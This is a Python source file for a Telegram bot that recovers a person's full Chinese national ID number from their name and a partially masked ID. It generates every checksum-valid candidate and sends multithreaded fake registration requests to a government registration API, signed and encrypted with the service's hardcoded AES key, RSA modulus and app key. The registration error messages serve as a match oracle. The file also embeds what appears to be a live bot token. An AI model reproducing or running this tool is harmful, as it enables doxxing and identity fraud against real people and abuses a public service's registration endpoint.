# -*- coding: utf-8 -*-
"""
断言出品核验工具 · Telegram Bot
"""
import os

for k in ('HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy',
          'ALL_PROXY', 'all_proxy', 'NO_PROXY', 'no_proxy'):
    os.environ.pop(k, None)

import telebot
from telebot import types

import requests
from requests.adapters import HTTPAdapter
import json
import hashlib
import random
import string
import time
import threading
import tempfile
import queue
from itertools import product
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import binascii
import calendar
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


BOT_TOKEN = "8826665439:AAGBRyGWApS5a6DYoU4Q3L2KNXey7YD38wI"

API_URL = "https://zwyd.mca.gov.cn/ggfwappbiz/public/neuRegister/register"
AES_KEY = "o7wwuqr7cy84415k"
RSA_N_HEX = "906C793510FB049452764740B21B97A51DAEA794AB6E43836269D5E6317D49226C12362BA22DAB5EC3BC79553A8A098B01F3C4D81A87B3EE5BD2F4F1431CC495EE2FE54688B212145BB32D56EEEEE1430CE26234331B291CFC53C9B84FAFFDF0B44371A032880C3D567F588D2CD5FCE28D9CDD2923CB547DAD219A6A1B8B5D3D"
RSA_E_HEX = "10001"
APP_KEY = "neujmggfw01@MZB"

MAX_SAFE = 200000
MAX_RETRY = 5

RSA_N = int(RSA_N_HEX, 16)
RSA_E = int(RSA_E_HEX, 16)


bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
user_state = {}
state_lock = threading.Lock()

_thread_local = threading.local()


def get_session():
    if not hasattr(_thread_local, 'session'):
        s = requests.Session()
        s.verify = False
        adapter = HTTPAdapter(pool_connections=64, pool_maxsize=64, max_retries=0)
        s.mount('http://', adapter)
        s.mount('https://', adapter)
        s.headers.update({
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate',
        })
        _thread_local.session = s
    return _thread_local.session


_LOWC = string.ascii_lowercase
_LOWD = string.ascii_lowercase + string.digits
_ALLC = string.ascii_letters + string.digits


def rand_str(n=16):
    return ''.join(random.choices(_LOWD, k=n))


def aes_enc(text, key, iv):
    c = AES.new(key.encode(), AES.MODE_CBC, iv=iv.encode())
    return binascii.hexlify(c.encrypt(pad(text.encode(), AES.block_size))).decode().upper()


def aes_dec(hex_text, key, iv):
    c = AES.new(key.encode(), AES.MODE_CBC, iv=iv.encode())
    return unpad(c.decrypt(binascii.unhexlify(hex_text)), AES.block_size).decode()


def rsa_enc(text):
    m_hex = ''.join(hex(ord(c))[2:].zfill(2) for c in reversed(text))
    result = hex(pow(int(m_hex, 16), RSA_E, RSA_N))[2:]
    return result.zfill(256)


def sign_md5(ts, en_str):
    raw = f"appKey={APP_KEY}&timestamp={ts}&enStr={en_str}"
    return hashlib.md5(raw.encode()).hexdigest()


def check_pwd(p):
    kb = ("qwertyuiop", "asdfghjkl", "zxcvbnm", "1234567890",
          "abcdefghijklmnopqrstuvwxyz")
    p = p.lower()
    for k in kb:
        for i in range(len(k) - 2):
            if k[i:i+3] in p or k[i:i+3][::-1] in p:
                return True
    return False


def generate_password():
    while True:
        pwd = list(
            random.choice(_LOWC) +
            random.choice(string.ascii_uppercase) +
            random.choice(string.digits) +
            ''.join(random.choices(_ALLC, k=9))
        )
        random.shuffle(pwd)
        pwd = ''.join(pwd)
        if not check_pwd(pwd):
            return pwd


def calc_check_digit(id17):
    w = (7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2)
    c = '10X98765432'
    total = sum(int(id17[i]) * w[i] for i in range(17))
    return c[total % 11]


def valid_birthday(y, m, d):
    if not (1940 <= y <= 2025):
        return False
    if not (1 <= m <= 12):
        return False
    max_d = calendar.monthrange(y, m)[1]
    return 1 <= d <= max_d


def generate_ids(partial, gender):
    partial = partial.upper().replace('*', 'X')
    fixed = None if partial[17] == 'X' else partial[17]

    if gender == "男":
        sex_digits = ('1', '3', '5', '7', '9')
    elif gender == "女":
        sex_digits = ('0', '2', '4', '6', '8')
    else:
        sex_digits = tuple(str(i) for i in range(10))

    x_pos = [i for i in range(17) if partial[i] == 'X']
    pool = [list('0123456789') if i in x_pos else [partial[i]] for i in range(17)]

    result = []
    for parts in product(*pool):
        id17 = ''.join(parts)
        if id17[16] not in sex_digits:
            continue
        try:
            y = int(id17[6:10])
            m = int(id17[10:12])
            d = int(id17[12:14])
            if not valid_birthday(y, m, d):
                continue
        except Exception:
            continue
        check = calc_check_digit(id17)
        if fixed is not None and check != fixed:
            continue
        result.append(id17 + check)
    return result


def estimate_total(card):
    card = card.upper().replace('*', 'X')
    n = 1
    for i in range(17):
        if card[i] == 'X':
            n *= 5 if i == 16 else 10
    return n


def parse_response(resp):
    errs = resp.get("errors", [])
    if resp.get("serviceSuccess") and not errs:
        return True
    if errs:
        msg = errs[0].get("msg", "")
        if "注册失败" in msg:
            return True
        if "不一致" in msg:
            return False
        if "已被注册" in msg:
            return True
        if "不匹配" in msg:
            return False
        return None
    return None


def verify_once(name, cert_no):
    session = get_session()

    for attempt in range(1, MAX_RETRY + 1):
        try:
            iv = rand_str(16)
            loginid = random.choice(_LOWC) + rand_str(11)
            pwd = generate_password()
            ts = int(time.time() * 1000)

            payload = {
                "loginid": loginid,
                "password": rsa_enc(pwd),
                "accountType": "10",
                "name": name,
                "certType": "111",
                "certNo": cert_no,
                "mobile": "18888888888",
                "nationality": "CHN",
                "field3": "2026-05-18",
                "field4": "2031-05-18",
                "registerType": "1",
                "PLATFORM": "4",
                "PLATFORMID": "oFtC6s8ajY9CyBkpVW95srxe25ZA",
                "timestamp": ts
            }

            en_str = aes_enc(json.dumps(payload, separators=(',', ':')), AES_KEY, iv)
            body = json.dumps({
                "enStr": en_str,
                "sign": sign_md5(ts, en_str),
                "iv": rsa_enc(iv)
            }, separators=(',', ':'))

            headers = {
                'Content-Type': 'application/json',
                'PLATFORM': '4',
                'Referer': 'https://servicewechat.com/wx12f5a00807e3ec6a/137/page-frame.html'
            }

            r = session.post(API_URL, data=body.encode('utf-8'),
                             headers=headers, timeout=15)

            try:
                data = r.json()
            except Exception:
                if attempt < MAX_RETRY:
                    continue
                return None

            if data.get("data"):
                try:
                    dec = aes_dec(data["data"], AES_KEY, iv)
                    resp_json = json.loads(dec)
                except Exception:
                    resp_json = data
            else:
                resp_json = data

            return parse_response(resp_json)
        except Exception:
            if attempt < MAX_RETRY:
                continue
            return None
    return None


def run_verify_task(chat_id, name, card, gender, workers):
    try:
        ids = generate_ids(card, gender)
    except Exception as e:
        bot.send_message(chat_id, f"❌ 生成失败：{e}")
        with state_lock:
            user_state.pop(chat_id, None)
        return

    if not ids:
        bot.send_message(chat_id, "❌ 未生成有效身份证号")
        with state_lock:
            user_state.pop(chat_id, None)
        return

    total = len(ids)
    log_lines = []
    log_lock = threading.Lock()

    def log(line):
        with log_lock:
            log_lines.append(line)

    start_time = time.time()

    log("════════ 开始核验 ════════")
    log(f"姓名：{name}")
    log(f"证件：{card}")
    log(f"性别：{gender}")
    log(f"线程：{workers}")
    log(f"预计：{total} 条")
    log("──────────────────────────")

    progress_id = None
    for _retry in range(3):
        try:
            prog_msg = bot.send_message(
                chat_id,
                f"<b>核验中...</b>\n\n已核验：0 / {total:,}"
            )
            progress_id = prog_msg.message_id
            break
        except Exception as e:
            print(f"[进度消息] 第 {_retry+1} 次失败: {e}")
            time.sleep(1)

    done_count = [0]
    hit_cert = [None]
    stop_evt = threading.Event()
    finished_evt = threading.Event()
    count_lock = threading.Lock()

    progress_q = queue.Queue(maxsize=1)

    def progress_loop():
        while not finished_evt.is_set():
            try:
                progress_q.get(timeout=0.2)
            except queue.Empty:
                continue

            if not progress_id:
                continue

            cur = done_count[0]
            elapsed = time.time() - start_time
            speed = cur / elapsed if elapsed > 0 else 0
            try:
                bot.edit_message_text(
                    f"<b>核验中...</b>\n\n"
                    f"已核验：{cur:,} / {total:,}\n"
                    f"速度：{speed:.1f} 条/秒\n"
                    f"耗时：{elapsed:.1f} 秒",
                    chat_id, progress_id, parse_mode='HTML'
                )
            except Exception:
                pass

    progress_thread = threading.Thread(target=progress_loop, daemon=True)
    progress_thread.start()

    def worker(cert):
        if stop_evt.is_set():
            return
        try:
            ok = verify_once(name, cert)
        except Exception:
            ok = None

        with count_lock:
            done_count[0] += 1
            seq = done_count[0]

        if ok is True:
            log(f"[{seq}] {cert} -> ✅ 核验成功")
            with count_lock:
                if hit_cert[0] is None:
                    hit_cert[0] = cert
                    stop_evt.set()
        elif ok is False:
            log(f"[{seq}] {cert} -> ❌ 核验失败")
        else:
            log(f"[{seq}] {cert} -> ⚠️ 异常")

        try:
            progress_q.put_nowait(1)
        except queue.Full:
            pass

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = set()
        idx = 0
        while True:
            while len(futures) < workers and idx < total and not stop_evt.is_set():
                futures.add(ex.submit(worker, ids[idx]))
                idx += 1
            if not futures:
                break
            done_set, futures = wait(futures, return_when=FIRST_COMPLETED)

    finished_evt.set()
    time.sleep(0.5)

    elapsed = time.time() - start_time

    log("──────────────────────────")

    hit = hit_cert[0]
    secondary_ok = None

    if hit:
        log(f"🎯 命中，开始二次核验：{hit}")
        if progress_id:
            try:
                bot.edit_message_text(
                    f"<b>二次核验中...</b>\n\n命中：<code>{hit}</code>",
                    chat_id, progress_id, parse_mode='HTML'
                )
            except Exception:
                pass
        try:
            secondary_ok = verify_once(name, hit)
        except Exception:
            secondary_ok = None

        if secondary_ok is True:
            log("✅ 二次核验通过，命中确认")
        elif secondary_ok is False:
            log("⚠️ 二次核验未通过，疑似误判")
        else:
            log("⚠️ 二次核验异常")

    log("──────────────────────────")
    if hit:
        log("✅ 核验成功")
        log(f"匹配证件号：{hit}")
    else:
        log("❌ 未找到匹配的证件号")
    log(f"共核验：{done_count[0]} 条")
    log(f"耗时：{elapsed:.2f} 秒")
    if elapsed > 0:
        log(f"速度：{done_count[0] / elapsed:.2f} 条/秒")
    log("════════ 核验结束 ════════")

    try:
        if hit:
            sec_text = "通过" if secondary_ok is True else (
                "未通过（疑似误判）" if secondary_ok is False else "异常"
            )
            final_text = (
                f"<b>✅ 核验成功</b>\n\n"
                f"姓名：<code>{name}</code>\n"
                f"身份证：<code>{hit}</code>\n"
                f"二次核验：{sec_text}\n\n"
                f"共核验：{done_count[0]:,} 条\n"
                f"耗时：{elapsed:.2f} 秒"
            )
        else:
            final_text = (
                f"<b>❌ 未找到匹配的证件号</b>\n\n"
                f"共核验：{done_count[0]:,} 条\n"
                f"耗时：{elapsed:.2f} 秒"
            )
        if progress_id:
            bot.edit_message_text(final_text, chat_id, progress_id, parse_mode='HTML')
        else:
            bot.send_message(chat_id, final_text)
    except Exception:
        pass

    try:
        content = "\n".join(log_lines)
        rand_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt',
                                         delete=False, encoding='utf-8') as f:
            f.write(content)
            tmp_path = f.name
        with open(tmp_path, 'rb') as f:
            bot.send_document(
                chat_id, f,
                visible_file_name=f"核验日志_{rand_name}.txt",
                caption=f"共 {done_count[0]} 条"
            )
        try:
            os.remove(tmp_path)
        except Exception:
            pass
    except Exception as e:
        try:
            bot.send_message(chat_id, f"⚠️ 日志发送失败：{e}")
        except Exception:
            pass

    with state_lock:
        user_state.pop(chat_id, None)


@bot.message_handler(commands=['start'])
def cmd_start(msg):
    chat_id = msg.chat.id
    with state_lock:
        user_state[chat_id] = {'step': 'name'}
    bot.send_message(chat_id, "<b>断言出品核验工具</b>\n\n请输入姓名：")


@bot.message_handler(commands=['cancel'])
def cmd_cancel(msg):
    chat_id = msg.chat.id
    with state_lock:
        user_state.pop(chat_id, None)
    bot.send_message(chat_id, "已取消。发送 /start 重新开始。")


@bot.message_handler(func=lambda m: (user_state.get(m.chat.id) or {}).get('step') == 'name')
def handle_name(msg):
    chat_id = msg.chat.id
    name = (msg.text or '').strip()
    if not name:
        bot.send_message(chat_id, "姓名不能为空，请重新输入：")
        return
    with state_lock:
        user_state[chat_id]['name'] = name
        user_state[chat_id]['step'] = 'card'
    bot.send_message(
        chat_id,
        f"姓名：<code>{name}</code>\n\n"
        "请输入 18 位模糊身份证号\n"
        "未知位用 <b>X</b> 或 <b>*</b> 表示"
    )


@bot.message_handler(func=lambda m: (user_state.get(m.chat.id) or {}).get('step') == 'card')
def handle_card(msg):
    chat_id = msg.chat.id
    card = (msg.text or '').strip().upper().replace('*', 'X')

    if len(card) != 18 or not all(c in '0123456789X' for c in card):
        bot.send_message(chat_id, "❌ 格式错误：必须 18 位，仅含数字、X 或 *")
        return

    est = estimate_total(card)
    if est > MAX_SAFE:
        bot.send_message(chat_id, f"❌ 预计 {est:,} 条超过上限 20 万，请减少 X 数量")
        return

    with state_lock:
        user_state[chat_id]['card'] = card
        user_state[chat_id]['est'] = est
        user_state[chat_id]['step'] = 'gender'

    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("男", callback_data="sex_男"),
        types.InlineKeyboardButton("女", callback_data="sex_女"),
        types.InlineKeyboardButton("未知", callback_data="sex_未知"),
    )
    bot.send_message(
        chat_id,
        f"证件：<code>{card}</code>\n"
        f"预计：<b>{est:,}</b> 条\n\n请选择性别：",
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith('sex_'))
def handle_gender(call):
    chat_id = call.message.chat.id
    gender = call.data[4:]

    with state_lock:
        st = user_state.get(chat_id)
        if not st or st.get('step') != 'gender':
            bot.answer_callback_query(call.id, "会话已过期，请 /start 重来")
            return
        st['gender'] = gender
        st['step'] = 'workers'

    try:
        bot.edit_message_reply_markup(chat_id, call.message.chat.id,
                                      call.message.message_id, reply_markup=None)
    except Exception:
        pass

    bot.answer_callback_query(call.id, f"性别：{gender}")

    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("5", callback_data="thr_5"),
        types.InlineKeyboardButton("10", callback_data="thr_10"),
        types.InlineKeyboardButton("20", callback_data="thr_20"),
        types.InlineKeyboardButton("50", callback_data="thr_50"),
    )
    bot.send_message(chat_id, "请选择线程数：", reply_markup=markup)


@bot.callback_query_handler(func=lambda c: c.data.startswith('thr_'))
def handle_threads(call):
    chat_id = call.message.chat.id
    workers = int(call.data[4:])

    with state_lock:
        st = user_state.get(chat_id)
        if not st or st.get('step') != 'workers':
            bot.answer_callback_query(call.id, "会话已过期，请 /start 重来")
            return
        st['workers'] = workers
        name = st['name']
        card = st['card']
        gender = st['gender']

    try:
        bot.edit_message_reply_markup(chat_id, call.message.chat.id,
                                      call.message.message_id, reply_markup=None)
    except Exception:
        pass

    bot.answer_callback_query(call.id, f"线程数：{workers}")
    bot.send_message(chat_id, f"✅ 开始核验 · 线程 {workers}")

    threading.Thread(
        target=run_verify_task,
        args=(chat_id, name, card, gender, workers),
        daemon=True
    ).start()


def start_bot():
    bot.infinity_polling(timeout=30, long_polling_timeout=20)


if __name__ == '__main__':
    start_bot()
